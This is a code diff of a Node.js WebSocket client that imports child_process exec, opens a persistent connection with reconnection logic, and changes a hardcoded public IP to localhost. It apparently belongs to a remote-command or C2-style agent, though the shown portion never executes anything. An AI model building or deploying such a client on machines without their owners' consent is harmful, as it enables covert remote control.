@@ -1,13 +1,13 @@
 const WS = require('ws')
 const os = require('os');
 const { exec } = require('child_process')
-let ws = new WS("ws://20.115.225.169:8080")
+let ws = new WS("ws://127.0.0.1:9000") // by default it will connect to localhost, change to server DNS name or domain name. Also change the port
 let connected = 0
-let reconnect_time = 60000*20
+let reconnect_time = 10000
 
 function connect() {
     connected += 1
-    ws = new WS("ws://20.115.225.169:8080")
+    ws = new WS("ws://127.0.0.1:9000")
     ws.on("open", () => {
         console.log("Connection establised")
         if (connected < 2) {
